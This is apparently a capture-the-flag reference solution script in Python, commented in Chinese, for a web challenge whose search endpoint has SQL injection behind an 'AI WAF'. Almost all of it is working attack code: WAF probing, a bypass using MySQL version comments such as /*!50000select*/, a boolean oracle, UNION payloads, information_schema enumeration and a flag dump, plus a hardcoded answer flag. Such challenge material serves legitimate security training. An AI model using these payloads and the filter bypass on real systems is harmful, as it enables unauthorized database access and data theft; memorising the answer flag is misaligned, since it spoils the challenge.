#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
solve.py — 环节三 web02（qid yahqei40sgs2n_bk）参考解法

漏洞：POST /search 的 JSON 字段 `query` 被直接拼进 LIKE 字符串上下文（未参数化），
      前置一层「AI WAF」做关键字拦截。WAF 的关键缺陷是
      **会先把 MySQL 版本注释 `/*!NNNNN ... */` 连内容一起剥掉，再做关键字匹配**，
      因此 `/*!50000select*/` 能穿透；而普通拆词 `sel/**/ect` 不被还原。

利用链：
  1) 单引号 `'` 放行 → 后端 500，确认存在注入且无其它转义
  2) 版本注释穿透 WAF（未注释写法一律 403）
  3) 布尔 oracle：`zzz' || (/*!50000select*/ (1=1) /*!50000from*/ information_schema.tables /*!50000limit*/ 0,1)#`
     → count=10 / 0
  4) UNION 3 列（id / title / content），第 3 列 content 回显
     `zzz' /*!50000union*/ /*!50000select*/ 1,2,(<子查询>)#`
  5) dump idap.flag.flag

用法：
  python solve.py --target http://127.0.0.1:8092
  python solve.py --target https://eci-xxxx.cloudeci1.ichunqiu.com:5000 --insecure
"""
from __future__ import annotations

import argparse
import json
import re
import sys
import time

import requests

requests.packages.urllib3.disable_warnings()

# 保证中文输出在 Windows 控制台/PowerShell 重定向下也是 UTF-8，不会变乱码
try:
    sys.stdout.reconfigure(encoding='utf-8')
    sys.stderr.reconfigure(encoding='utf-8')
except Exception:                               # noqa: BLE001
    pass

# 比赛期间平台真值，仅用于「本地 flag 是否被换掉」的自检提示
ORIGINAL_FLAG = 'flag{1930275d-5db2-4cd0-adf2-e950621afc2d}'


class Solver(object):
    def __init__(self, target: str, delay: float = 0.35, insecure: bool = True):
        self.target = target.rstrip('/')
        self.delay = delay
        self.s = requests.Session()
        self.s.trust_env = False
        self.s.headers.update({'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'})
        self.verify = not insecure

    # ------------------------------------------------------------------ #
    def raw(self, query: str, tries: int = 4):
        """发一次 /search，返回 (status_code, text)。"""
        body = json.dumps({'query': query}, ensure_ascii=False).encode('utf-8')
        last = None
        for _ in range(tries):
            try:
                r = self.s.post(self.target + '/search', data=body, timeout=25,
                                verify=self.verify)
                if r.status_code == 429:            # WAF 限速 → 退避
                    time.sleep(1.5)
                    continue
                return r.status_code, r.text
            except Exception as e:                  # noqa: BLE001
                last = e
                time.sleep(0.8)
        return None, 'ERR %r' % (last,)

    def inject(self, sub: str, tries: int = 3):
        """把子查询塞进 UNION 第 3 列（content，回显列）。"""
        pl = "zzz' /*!50000union*/ /*!50000select*/ 1,2,(%s)#" % sub
        for _ in range(tries):
            time.sleep(self.delay)
            code, text = self.raw(pl)
            if code == 200:
                try:
                    j = json.loads(text)
                except Exception:                   # noqa: BLE001
                    return '(non-json) ' + text[:200]
                res = j.get('results') or []
                if res:
                    return res[0].get('content')
                return '(count=%s)' % j.get('count')
            if code == 403:
                return 'WAF-BLOCK ' + text[:120]
            if code is None:
                continue
            return '[%s] %s' % (code, text[:120])
        return '(timeout)'

    def oracle(self, cond: str):
        """布尔 oracle：条件为真时 count>0。"""
        pl = ("zzz' || (/*!50000select*/ (%s) /*!50000from*/ information_schema.tables "
              "/*!50000limit*/ 0,1)#" % cond)
        time.sleep(self.delay)
        code, text = self.raw(pl)
        if code != 200:
            return None
        try:
            return json.loads(text).get('count', 0) > 0
        except Exception:                           # noqa: BLE001
            return None

    # ------------------------------------------------------------------ #
    def health(self):
        print('[*] target = %s' % self.target)
        try:
            r = self.s.get(self.target + '/', timeout=15, verify=self.verify)
            title = re.search(r'<title>(.*?)</title>', r.text, re.S)
            print('    GET /        %s  title=%s' % (r.status_code,
                                                     title.group(1).strip() if title else '?'))
        except Exception as e:                      # noqa: BLE001
            print('    GET /        ERR %r' % (e,))
            return False
        code, text = self.raw('hello')
        print('    POST /search %s  %s' % (code, text[:120]))
        return code == 200

    def step1_filter_map(self):
        print('\n=== [1] WAF 边界探测（哪些被拦、哪些放行）===')
        cases = [
            ('hello',                       'benign'),
            ("'",                            'single quote (应放行→500 语法错)'),
            ('or 1=1',                       'classic or'),
            ('and 1=1',                      'classic and'),
            ('union select 1,2,3',           'classic union'),
            ("' || 1#",                      'double pipe'),
            ("xor 1",                        'xor'),
            ('sel/**/ect',                   'plain comment split (应放行→500)'),
            ('/*!50000select*/ 1',           'version comment (应放行)'),
            ('limit 0,1',                    'limit'),
            ('ascii(substr(1,1,1))',         'ascii()'),
            ('database()',                   'database()'),
            ('@@version',                    '@@version'),
            ('from dual',                    'from dual'),
        ]
        for q, label in cases:
            code, text = self.raw(q)
            if code == 403:
                note = 'WAF-BLOCK'
            elif code == 500:
                note = 'PASS→SQL 语法错 (无 filtering)'
            elif code == 200:
                try:
                    note = 'PASS count=%s' % json.loads(text).get('count')
                except Exception:                   # noqa: BLE001
                    note = 'PASS ' + text[:60]
            else:
                note = str(code)
            print('    %-30s %-6s %s' % (repr(q)[:30], code, note + '   # ' + label))
            time.sleep(self.delay)

    def step2_boolean(self):
        print('\n=== [2] 布尔 oracle（版本注释穿透）===')
        t = self.oracle('1=1')
        f = self.oracle('1=2')
        print('    (1=1) -> count>0 ? %s' % t)
        print('    (1=2) -> count>0 ? %s' % f)
        if t is True and f is False:
            print('    [+] oracle 可用')
        else:
            print('    [-] oracle 不可用（可能 WAF 行为不同）')

    def step3_union(self):
        print('\n=== [3] 确定 UNION 列数 ===')
        for n in range(1, 6):
            cols = ','.join(str(i) for i in range(1, n + 1))
            time.sleep(self.delay)
            code, text = self.raw("zzz' /*!50000union*/ /*!50000select*/ %s#" % cols)
            ok = ''
            if code == 200:
                try:
                    j = json.loads(text)
                    ok = 'count=%s' % j.get('count')
                    if j.get('results'):
                        ok += ' ' + json.dumps(j['results'][0], ensure_ascii=False)[:80]
                except Exception:                   # noqa: BLE001
                    ok = text[:80]
            print('    %d 列 -> %s %s' % (n, code, ok))
        print('    （3 列可用；第 3 列 content 是回显位）')

    def step4_enum(self):
        print('\n=== [4] 库/表枚举（information_schema）===')
        for label, sub in [
            ('current_user', "/*!50000select*/ current_user()"),
            ('version',      "/*!50000select*/ version()"),
            ('secure_file_priv', "/*!50000select*/ @@secure_file_priv"),
            ('schemata',     "/*!50000select*/ group_concat(schema_name) /*!50000from*/ information_schema.schemata"),
            ('idap tables',  "/*!50000select*/ group_concat(table_name) /*!50000from*/ information_schema.tables /*!50000where*/ table_schema=0x69646170"),
            ('idap columns', "/*!50000select*/ group_concat(table_name,0x3a,column_name) /*!50000from*/ information_schema.columns /*!50000where*/ table_schema=0x69646170"),
        ]:
            v = self.inject(sub)
            print('    %-16s %s' % (label, str(v)[:220]))

    def step5_flag(self):
        print('\n=== [5] 取 flag：idap.flag.flag ===')
        for sub in [
            "/*!50000select*/ flag /*!50000from*/ idap.flag",
            "/*!50000select*/ group_concat(flag) /*!50000from*/ idap.flag",
            "/*!50000select*/ flag /*!50000from*/ idap.flag /*!50000limit*/ 0,1",
        ]:
            v = self.inject(sub)
            print('    %s\n      -> %s' % (sub, str(v)[:300]))
            m = re.search(r'flag\{[^}]*\}', str(v))
            if m:
                return m.group()
        return None

    def run(self) -> int:
        if not self.health():
            print('[!] 目标不可达')
            return 3
        self.step1_filter_map()
        self.step2_boolean()
        self.step3_union()
        self.step4_enum()
        flag = self.step5_flag()
        print()
        if flag:
            print('[+] FLAG = %s' % flag)
            if flag != ORIGINAL_FLAG:
                print('    (注：与比赛期间平台记录的真值不同 → 本地复现时换了 flag)')
            return 0
        print('[!] 未取得 flag')
        return 2


def main():
    ap = argparse.ArgumentParser(description='环节三 web02 AI-WAF SQLi 参考解')
    ap.add_argument('--target', default='http://127.0.0.1:8092',
                    help='目标基址，例如 http://127.0.0.1:8092')
    ap.add_argument('--delay', type=float, default=0.35, help='每次请求间隔（秒）')
    ap.add_argument('--insecure', action='store_true', default=True,
                    help='忽略 TLS 证书校验（默认开）')
    a = ap.parse_args()
    sys.exit(Solver(a.target, a.delay, a.insecure).run())


if __name__ == '__main__':
    main()
